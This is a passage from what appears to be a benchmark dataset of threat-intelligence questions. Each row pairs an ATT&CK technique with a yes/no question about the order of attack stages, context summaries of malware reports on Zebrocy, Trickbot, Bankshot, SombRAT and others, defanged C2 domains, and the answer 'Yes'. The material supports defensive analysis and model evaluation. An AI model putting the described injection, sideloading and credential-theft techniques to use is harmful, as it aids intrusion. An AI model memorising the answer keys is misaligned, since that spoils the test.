Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
448,155,155-Defense Evasion-T1055-Process Injection,"After using the launcher to create a hardcoded directory, copy all files, and execute dlpumgr32.exe using Windows Management Instrumentation (WMI), is it likely that the launcher will decrypt the config.res and data.res files, set up persistence through the registry or service creation, and then inject the appropriate shellcode into a suspended svchost.exe process before resuming it?","Defense Evasion: The launcher acts as an installer   The launcher starts by instantiating the CLoadInfo object, which has the following structure:  Offset Description  Hardcoded values in our sample  VTable of CLoadInfo class  Directory to copy all files  %PROGRAMDATA%\Test\  Name of the legitimate executable  dlpumgr32.exe  Name of the sideloaded DLL  DLPPREM32.DLL  Name of the shellcode  DLPPREM32.bin  Name of the encrypted payload  data.res  MD5 of the encrypted payload  e43e40416520dab5b4c44ac8af907078  Name of the encrypted configuration config.res  Name of the registry key value  servTest  Name of the service DisplayName  Servdisplay  Table 1. CLoadInfo object structure  The launcher's behavior changes depending on the number of arguments passed to the executable. It's important to highlight that the change of behavior only depends on the number of arguments, and not the content:  No argument. If there is no argument, a hardcoded directory will be created wherein all the files will be copied. The CreationTime, LastWriteTime, and LastAccessTime will be updated according to the C:\Windows\system32\kernel32.dll file and their file attributes will be set to ""hidden"" and ""system"". Windows Management Instrumentation (WMI) will be used to run dlpumgr32.exe with arguments ""-up-run -x"" and it will exit the current process.  One argument. It will skip the decoding of the configuration and persistence setup, and will perform the same behavior as one with three arguments.  Three arguments.  The launcher first decrypts the config.res file with a hardcoded Data Encryption Standard (DES) key. It encodes it using another key and writes it to the registry key ""Software\Classes\scConfig"" (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER hive, depending on the privileges of the process).  After decrypting the configuration, the config.res file is deleted.  Depending on the privileges of the process, the malware will add a value to the ""Software\Microsoft\Windows\CurrentVersion\Run"" key, or it will create a service that runs the malware at boot time  The launcher decrypts the data.res file with a different hardcoded DES key. The result is a file with the following structure:  Size of the 32-bit shellcode  32-bit shellcode  Size of the 64-bit shellcode  64-bit shellcode  Table 2. Structure of decrypted data.res file  Lastly, the launcher starts a suspended process with the command line ""C:\Windows\system32\svchost.exe -k LocalServices,"" and injects the appropriate shellcode into it (either 32- or 64-bit). It will then resume the newly created process and exit the current process.  The following diagram summarizes the launch procedure:  Figure 2. The launch procedure of the updated tool  The payload itself is a new version of SysUpdate.","Execution: This blog details how Iron Tiger threat actors have updated their toolkit with an updated SysUpdate malware variant that now uses five files in its infection routine instead of the usual three. The threat actor used five files: dlpumgr32.exe, a legitimate signed file that belongs to the DESlock+ product; DLPPREM32.DLL, a malicious DLL sideloaded by dlpumgr32.exe that loads and decodes DLPPREM32.bin; DLPPREM32.bin, a shellcode that decompresses and loads a launcher in memory; data.res, an encrypted file decoded by the launcher and contains two SysUpdate versions: one for a 32-bit architecture and another for a 64-bit architecture; config.res, an encrypted file decoded by the launcher and contains the SysUpdate configuration, such as the command-and-control (C&C) address.",Yes,Iron Tiger APT Updates Toolkit With Evolved SysUpdate Malware
458,157,157-Defense Evasion-T1071-Application Layer Protocol,"After the dropper sends the MAC address and user-id of the poisoned computer during the persistence stage, is it likely that the CEIDPageLock driver will connect with one of the C&C hard-coded domains to download the encrypted homepage configuration for tampering with the browser during the defense evasion stage?",Defense Evasion: The driver is a 32-bit kernel-mode driver that is launched among the standard system drivers during startup. It employs tricks to evade and hide from endpoint security products. The driver connects with one of two C&C hard-coded domains to download the homepage configuration to tamper with the browser. The homepage is downloaded encrypted from the C&C server.,"Initial Access: Over the last few weeks, a rootkit named CEIDPageLock has been distributed by the RIG Exploit kit. The rootkit, first discovered by 360 Security Center, was detected tampering with the homepage of a victim's browser, redirecting it to a site pretending to be 2345.com, a Chinese web directory.
Persistence: The dropper's main responsibility is to extract the driver from the file and save it in the \Windows\Temp directory as houzi.sys. The dropped driver, previously named CEID.sys, has a revoked certificate signed by  [+]  [+] Thawte Code Signing CA  [+] thawte. After registering and starting the driver, the dropper sends the MAC address and user-id of the poisoned computer to the domain www[.]tj999[.]top.
Collection: CEIDPageLock operators gather browsing data on victims, monitoring the sites users visit and the duration of their visits. This information is used to target ad campaigns or sold to other companies for marketing purposes.
Command and Control: The driver's main functionality is to connect with one of two C&C hard-coded domains to download the desired homepage configuration to tamper with the browser.
Others: CEIDPageLock targets Chinese victims specifically, with a negligible number of infections outside of China. The malware adds a method of creating a registry key in safemon- 360safe's security product, as part of the rootkit installation routine. The rootkit sets the value  [+] 0 under the registry key:  [+] \Registry\Machine\Software\Wow6432Node\360Safe\safemon\ATHPJUMP",Yes,ceidpagelock-a-chinese-rootkit
459,157,157-Collection-T1213-Data from Information Repositories,"After CEIDPageLock operators employ tricks to hide the driver from endpoint security products and evade defenses during the Defense Evasion phase, is it likely that they will gather browsing data on victims and use this information for targeted ad campaigns or selling to marketing companies as part of the Collection phase?","Collection: CEIDPageLock operators gather browsing data on victims, monitoring the sites users visit and the duration of their visits. This information is used to target ad campaigns or sold to other companies for marketing purposes.","Initial Access: Over the last few weeks, a rootkit named CEIDPageLock has been distributed by the RIG Exploit kit. The rootkit, first discovered by 360 Security Center, was detected tampering with the homepage of a victim's browser, redirecting it to a site pretending to be 2345.com, a Chinese web directory.
Persistence: The dropper's main responsibility is to extract the driver from the file and save it in the \Windows\Temp directory as houzi.sys. The dropped driver, previously named CEID.sys, has a revoked certificate signed by  [+]  [+] Thawte Code Signing CA  [+] thawte. After registering and starting the driver, the dropper sends the MAC address and user-id of the poisoned computer to the domain www[.]tj999[.]top.
Defense Evasion: The driver is a 32-bit kernel-mode driver that is launched among the standard system drivers during startup. It employs tricks to evade and hide from endpoint security products. The driver connects with one of two C&C hard-coded domains to download the homepage configuration to tamper with the browser. The homepage is downloaded encrypted from the C&C server.
Command and Control: The driver's main functionality is to connect with one of two C&C hard-coded domains to download the desired homepage configuration to tamper with the browser.
Others: CEIDPageLock targets Chinese victims specifically, with a negligible number of infections outside of China. The malware adds a method of creating a registry key in safemon- 360safe's security product, as part of the rootkit installation routine. The rootkit sets the value  [+] 0 under the registry key:  [+] \Registry\Machine\Software\Wow6432Node\360Safe\safemon\ATHPJUMP",Yes,ceidpagelock-a-chinese-rootkit
463,158,158-Execution-T1203-Exploitation for Client Execution,"After initial access is gained through spear phishing emails containing the embedded Adobe Flash exploit CVE-2018-4878, is it likely that the Bankshot implant will communicate with control servers disguised as ZIP files after being executed via exploitation for client execution in the malicious Word document Agreement.docx?",Execution: The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx. The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange. The author of this document is test-pc. It was created February 26 and was submitted from the Netherlands. The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.,"Reconnaissance: On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations. In this analysis, we observed the return of Hidden Cobra's Bankshot malware implant surfacing in the Turkish financial system. Based on the code similarity, the victim's business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT.
Resource Development: Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity. The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear. These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim's system. This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Initial Access: Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document. The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency. The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant.
Persistence: Bankshot is designed to persist on a victim's network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.
Defense Evasion: The Bankshot implant is designed to evade detection and persist on a victim's network for further exploitation. The implant contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
Command and Control: The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites. These URLs can be found hardcoded in the implants' code. The US government reports that Bankshot is used by Hidden Cobra to target multiple industries including financial organizations. This implant has been connected to a major Korean bank attack and is also known as Trojan Manuscript. That variant contained the capability to search for hosts related to the SWIFT network and the same control server strings as the variant we found targeting the Turkish financial sector.
Others: The campaign has a high chance of success against victims who have an unpatched version of Flash. Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal. This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017. McAfee detects these threats as RDN/Generic Exploit, RDN/Generic.dx, Generic PWS.y, Generic.hbg, Exploit-CVE2018-4878. McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk.",Yes,hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant
479,16,16-Command and Control-T1105-Ingress Tool Transfer,"After Trickbot steals credentials and information from various applications such as Filezilla and internet browsers, is it likely that it will connect to a URL to download its payload, decode it using certutil.exe, and execute it during the Command and Control phase?","Command and Control: The malware connects to a URL (hxxps://185[.]159[.]82[.]15/hollyhole/c644[.]php) to download its payload. If the file is executable, it is saved and executed from the %Temp% directory. If not, it is saved as a .cro file, decoded using certutil.exe, and then executed.","Initial Access: The Trickbot banking trojan campaign initiates with spam emails containing a Microsoft Word document with an enabled macro. When the document is opened, it drops a heavily obfuscated JavaScript (JS) file designed to download Trickbot as its payload.
Execution: The obfuscated JS file, once executed, displays a fake Microsoft error to mislead the user while the script runs in the background. It creates a copy of itself in the Startup folder as Shell.jse for persistence.
Persistence: For persistence, Trickbot creates a copy of itself in the Startup folder as Shell.jse.
Defense Evasion: Trickbot exhibits anti-analysis characteristics by checking the total number of running processes on the victim's machine to evade detection. It assumes a virtual or sandbox environment if the process count is below a certain threshold and will not proceed with execution. It also checks for specific analysis-related processes and usernames.
Credential Access: This variant of Trickbot is capable of stealing credentials and information from applications such as Filezilla, Microsoft Outlook, PuTTy, Remote Desktop (RDP), VNC, WinSCP, and internet browsers including Google Chrome, Internet Explorer, Microsoft Edge, and Mozilla Firefox. It gathers data such as autofills, billing information, browsing history, credit card data, HTTP POST responses, internet cookies, usernames, and passwords.
Collection: Trickbot uses a point-of-sale (PoS) extraction module called psfin32 to identify PoS-related terms in the domain of interest. It also drops shadnewdll, a proxy module that intercepts and modifies web traffic to create fraudulent bank transactions.
Impact: Trickbot deletes files with specific extensions located in removable and network drives, replacing them with a copy of the malware. The targeted file extensions include those used by Microsoft Office and OpenDocument formats.
Others: The Trickbot campaign primarily affected the United States and also targeted China, Canada, and India. The spam emails falsely claim to be subscription notifications and prompt users to view an attached document containing the malicious script. Trend Micro's security solutions can detect and block the malicious files and URLs associated with this campaign. Indicators of Compromise (IoCs) include various SHA-256 hashes and the URL used for downloading the Trickbot payload.",Yes,Latest Trickbot Campaign Delivered via Highly Obfuscated JS File 
502,161,161-Discovery-T1046-Network Service Discovery,Is it likely that the CostaRicto Campaign will employ process injection using the PowerSploit module for defense evasion before utilizing tools like pscan and nmap for network service scanning as part of discovery activities?,"Discovery: The SombRAT backdoor, part of the CostaRicto Campaign, had capabilities for process discovery, system information discovery, and system time discovery. Additionally, tools like pscan and nmap were used for network service scanning.","Initial Access: The CostaRicto Campaign, identified by the BlackBerry Research and Intelligence Team, leveraged stolen credentials to gain initial access to victims' environments. The attackers utilized SSH tools to set up remote tunneling, redirecting traffic from malicious domains to a proxy listening on a local port. The tunnel authentication was performed using the attackers' private keys. Payload stagers, either HTTP or reverse-DNS, were executed using scheduled tasks to download the backdoor.
Execution: The CostaRicto Campaign executed malicious code through various methods. The 64-bit backdoor was deployed using scripts and encrypted files, with a PowerShell loader based on the Invoke-ReflectivePEInjection PowerSploit module to inject the final payload DLL into memory. The 32-bit backdoor utilized a custom VM-based payload loader, CostaBricks, which implemented a simple virtual machine mechanism to decode and inject the payload into memory.
Defense Evasion: The CostaRicto Campaign employed defense evasion techniques such as process injection using the Invoke-ReflectivePEInjection PowerSploit module and deobfuscation to decode files or information related to the SombRAT backdoor.
Collection: The CostaRicto Campaign's SombRAT backdoor archived collected data using a custom storage file format.
Command and Control: The CostaRicto Campaign's SombRAT backdoor communicated with C2 servers using protocol tunneling over DNS and HTTP. The traffic was SSL-encrypted and capable of bypassing HTTP/SOCKS5 proxies. The C2 domain name was hardcoded in the binary and obfuscated. RSA encryption was used to secure the AES key exchange for C2 traffic. Proxy tools like pcheck HTTP/S proxy, GO SOCKS5 proxy, and PuTTY were also used.
Exfiltration: The SombRAT backdoor exfiltrated data over the C2 channel.",Yes,The CostaRicto Campaign_ Cyber-Espionage Outsourced
508,161,161-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the CostaRicto Campaign established communication with C2 servers using protocol tunneling over DNS and HTTP, is it likely that the SombRAT backdoor will exfiltrate data over the C2 channel following the use of SSL-encrypted traffic and RSA-secured AES key exchanges for C2 communication?",Exfiltration: The SombRAT backdoor exfiltrated data over the C2 channel.,"Initial Access: The CostaRicto Campaign, identified by the BlackBerry Research and Intelligence Team, leveraged stolen credentials to gain initial access to victims' environments. The attackers utilized SSH tools to set up remote tunneling, redirecting traffic from malicious domains to a proxy listening on a local port. The tunnel authentication was performed using the attackers' private keys. Payload stagers, either HTTP or reverse-DNS, were executed using scheduled tasks to download the backdoor.
Execution: The CostaRicto Campaign executed malicious code through various methods. The 64-bit backdoor was deployed using scripts and encrypted files, with a PowerShell loader based on the Invoke-ReflectivePEInjection PowerSploit module to inject the final payload DLL into memory. The 32-bit backdoor utilized a custom VM-based payload loader, CostaBricks, which implemented a simple virtual machine mechanism to decode and inject the payload into memory.
Defense Evasion: The CostaRicto Campaign employed defense evasion techniques such as process injection using the Invoke-ReflectivePEInjection PowerSploit module and deobfuscation to decode files or information related to the SombRAT backdoor.
Discovery: The SombRAT backdoor, part of the CostaRicto Campaign, had capabilities for process discovery, system information discovery, and system time discovery. Additionally, tools like pscan and nmap were used for network service scanning.
Collection: The CostaRicto Campaign's SombRAT backdoor archived collected data using a custom storage file format.
Command and Control: The CostaRicto Campaign's SombRAT backdoor communicated with C2 servers using protocol tunneling over DNS and HTTP. The traffic was SSL-encrypted and capable of bypassing HTTP/SOCKS5 proxies. The C2 domain name was hardcoded in the binary and obfuscated. RSA encryption was used to secure the AES key exchange for C2 traffic. Proxy tools like pcheck HTTP/S proxy, GO SOCKS5 proxy, and PuTTY were also used.",Yes,The CostaRicto Campaign_ Cyber-Espionage Outsourced
518,164,164-Execution-T1129-Shared Modules,"After facilitating initial access through a decoy installer disguised as a legitimate Cisco AnyConnect Mobility Client, is it likely that the INOCNATION campaign's RAT installer will execute a malicious DLL payload before setting up a persistence mechanism by creating a registry key for the payload malware?","Execution: The INOCNATION campaign's RAT installer executed a malicious DLL payload, which was obfuscated and rebuilt during installation. The malware employed anti-behavioral analysis techniques, such as comparing mouse cursor positions to detect sandbox environments. Additionally, the malware used a mangled MZ header to deceive security products and evade detection.","Initial Access: The INOCNATION campaign utilized a decoy installer for Cisco AnyConnect Mobility Client to facilitate initial access. The installer, disguised as a legitimate application, would execute regardless of the victim's decision to cancel the installation, silently creating and entrenching the malware into the system's background. The use of a widely recognized security application as an embedded decoy indicates a sophisticated ploy to deceive average users or less experienced system administrators.
Persistence: The RAT installer set up a persistence mechanism for the payload malware by creating a registry key for entrenchment. This key would be referenced during the uninstall routine, indicating the malware's capability to maintain its foothold on the system.
Defense Evasion: The INOCNATION campaign's malware exhibited several defense evasion techniques, including the use of XOR obfuscation for components and strings, sandbox detection, and a mangled MZ header to deceive security products. The malware also employed string stacking obfuscation with Unicode strings and multiple layers of obfuscation for its command and control traffic.
Command and Control: The malware used encrypted HTTPS via SSL/TLS connections for command and control communications, employing Windows' standard SSL/TLS libraries. To further obfuscate the communications, the malware used a single-byte XOR encoding within the decrypted SSL/TLS communication. This additional layer of obfuscation was designed to thwart detection and analysis efforts, even in environments with SSL inspection devices.
Others: The INOCNATION campaign's malware was capable of receiving commands from its C2 server, including process execution, reverse shell, file activity, uploading and downloading files, system information retrieval, and uninstalling the malware. The uninstall command suggests that the threat actor aimed to maintain a limited number of victims by removing the tool when commanded. Fidelis Cybersecurity's products detect the activity documented in this report, and additional technical indicators are published on their GitHub repository. The malware samples analyzed in this report were shared by CrowdStrike.",Yes,FTA_1020_Fidelis_Inocnation_FINAL
524,164,164-Command and Control-T1573-Encrypted Channel,"After employing XOR obfuscation, sandbox detection, and string stacking obfuscation for defense evasion during its operation, is the INOCNATION malware likely to use encrypted HTTPS via SSL/TLS connections and Windows' standard SSL/TLS libraries for command and control communications?","Command and Control: The malware used encrypted HTTPS via SSL/TLS connections for command and control communications, employing Windows' standard SSL/TLS libraries. To further obfuscate the communications, the malware used a single-byte XOR encoding within the decrypted SSL/TLS communication. This additional layer of obfuscation was designed to thwart detection and analysis efforts, even in environments with SSL inspection devices.","Initial Access: The INOCNATION campaign utilized a decoy installer for Cisco AnyConnect Mobility Client to facilitate initial access. The installer, disguised as a legitimate application, would execute regardless of the victim's decision to cancel the installation, silently creating and entrenching the malware into the system's background. The use of a widely recognized security application as an embedded decoy indicates a sophisticated ploy to deceive average users or less experienced system administrators.
Execution: The INOCNATION campaign's RAT installer executed a malicious DLL payload, which was obfuscated and rebuilt during installation. The malware employed anti-behavioral analysis techniques, such as comparing mouse cursor positions to detect sandbox environments. Additionally, the malware used a mangled MZ header to deceive security products and evade detection.
Persistence: The RAT installer set up a persistence mechanism for the payload malware by creating a registry key for entrenchment. This key would be referenced during the uninstall routine, indicating the malware's capability to maintain its foothold on the system.
Defense Evasion: The INOCNATION campaign's malware exhibited several defense evasion techniques, including the use of XOR obfuscation for components and strings, sandbox detection, and a mangled MZ header to deceive security products. The malware also employed string stacking obfuscation with Unicode strings and multiple layers of obfuscation for its command and control traffic.
Others: The INOCNATION campaign's malware was capable of receiving commands from its C2 server, including process execution, reverse shell, file activity, uploading and downloading files, system information retrieval, and uninstalling the malware. The uninstall command suggests that the threat actor aimed to maintain a limited number of victims by removing the tool when commanded. Fidelis Cybersecurity's products detect the activity documented in this report, and additional technical indicators are published on their GitHub repository. The malware samples analyzed in this report were shared by CrowdStrike.",Yes,FTA_1020_Fidelis_Inocnation_FINAL
538,167,167-Defense Evasion-T1574-Hijack Execution Flow,Is it likely that the PIVY variant will execute the copied rundll32.exe as ActiveFlash.exe to perform its malicious actions before using DLL sideloading to load the dropped DLL for defense evasion?,"Defense Evasion: The PIVY variant uses DLL sideloading to load the dropped DLL and perform its malicious actions. The malware's configuration has been modified to confuse some publicly available tools that parse the configuration data. The C2s are no longer null-padded, and each hostname ends with a null-byte followed by a string that changes slightly with each Command & Control (C2) server.","Initial Access: The infamous Remote Access Trojan (RAT) Poison Ivy (PIVY) has been observed targeting various Asian countries. A new variant, SPIVY, uses DLL sideloading and operates differently from a variant active for at least the past 12 months. The PIVY variant drops a decoy document, a DLL named ActiveUpdate.dll, and the PIVY shellcode file as Active.dat in a directory named ActiveUpdate_[0-9]{3}. It copies rundll32.exe to ActiveFlash.exe, executes the new file with the path to the DLL, and installs itself for automatic startup via a .lnk in the Windows Startup folder.
Execution: The PIVY variant copies rundll32.exe to ActiveFlash.exe and then executes the new file with the path to the DLL to perform its malicious actions. This deployment tactic has been used previously with different executable names for the rundll32 copy and the base directory name.
Persistence: The PIVY variant installs itself for automatic startup via a .lnk in the Windows Startup folder.
Command and Control: The PIVY samples communicate with C2 servers such as webserver.servehttp[.]com and admin.nslookupdns[.]com. The IP resolved to by these hostnames overlapped with fileshare.serveftp[.]com, which was used in an earlier PIVY sample. The C2s are no longer null-padded, and each hostname ends with a null-byte followed by a string that changes slightly with each C2 server.
Others: PIVY samples were observed targeting Myanmar and several other countries in Asia. The exact targets and delivery methods are not known, but the documents and submission sources provide strong hints as to the motivations and potential targets of these exploitation campaigns. The targeting of post-election Myanmar appears to be following the same style as what was mentioned in the ""Uncovering the Seven Pointed Dagger"" paper by ASERT. A possible connection exists given that the C2 for these samples resolved to an IP contained within 103.240.203.0/22, as did a 9002 RAT sample in the Seven Pointed Dagger exploitation campaign. A ""LURK0"" Gh0strat and another PIVY domain were also observed to have resolved to IPs contained within this range, making this subnet more suspicious from a targeted attack perspective.",Yes,"New Poison Ivy Activity Targeting Myanmar, Asian Countries"
554,171,171-Initial Access-T1566-Phishing,"After compromising hosting for ENVYSCOUT CobaltStrike redirectors and using actual CobaltStrike C2 domains for facilitating malicious activities, is it likely that the adversaries utilized ENVYSCOUT to deliver SNOWYAMBER, HALFRIG, and QUARTERRIG through various URLs and domains to gain Initial Access?","Initial Access: The CTI report indicates that the adversaries used ENVYSCOUT to deliver SNOWYAMBER, HALFRIG, and QUARTERRIG through various URLs and domains. For instance, ENVYSCOUT delivered SNOWYAMBER ZIP and ISO files through URLs such as totalmassasje[.]no/schedule.php and signitivelogics[.]com/Schedule.html. Additionally, domains like humanecosmetics[.]com and literaturaelsalvador[.]com were used to host the malicious content. The adversaries also compromised hosting for ENVYSCOUT CobaltStrike redirectors and used actual CobaltStrike C2 domains like communitypowersports[.]com and sanjosemotosport[.]com.","Defense Evasion: The adversaries made a mistake while compiling a sample of SNOWYAMBER, resulting in internal functions being added to exports. These functions included those authored by the adversary as well as those from libraries such as SysWhispers3, Nlohmann JSON, and Obfuscate. The binary itself was stripped, but the exported functions had names that could be demangled, revealing naming, prototypes, and datatypes.
Command and Control: The report details various indicators for Command and Control (C2) infrastructure used by the adversaries. For SNOWYAMBER, a URL pattern for an ENVYSCOUT backend fingerprint collector was identified as sawabfoundation[.]net/p.php?ip=<IP>&ua=<USER_AGENT>. Domains such as sawabfoundation[.]net and communitypowersports[.]com were used for hosting ENVYSCOUT CobaltStrike redirectors, while sanjosemotosport[.]com served as an actual CobaltStrike C2 domain. For QUARTERRIG, C2 URLs included pateke[.]com/auth/login.php and gatewan[.]com/c/msdownload/update/others/2021/10/se9fW4z8WJtmMyPQu, among others. The report also lists IP addresses associated with QUARTERRIG servers and COBALT STRIKE handlers.
Others: The CTI report by Military Counterintelligence Service and CERT.PL provides IoC references for SNOWYAMBER, HALFRIG, and QUARTERRIG. It includes detailed information about file names, sizes, and hashes (MD5, SHA1, SHA256) for various samples dated from 24/10/2022 to 8/02/2023. The report also mentions that all samples will be uploaded to VirusTotal, MalwareBaazar, and MalShare services to aid the cybersecurity community in analyzing, tracking, and disrupting adversary activity.",Yes,IoC_Reference_
565,172,172-Collection-T1115-Clipboard Data,"After the malware collected discovery data such as hostname, IP address, and information about Bitcoin wallet addresses, is it likely to have recording features for clipboard logging before interacting with Dropbox for uploading encoded clipboard log files with specific filenames?","Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
567,172,172-Collection-T1113-Screen Capture,"After gathering discovery information such as IP address, hostname, username, operating system version, and Bitcoin wallet addresses from the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt, is it likely that the malware will collect data through screen recording, keylogging, and clipboard logging before interacting with Dropbox for C&C operations?","Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
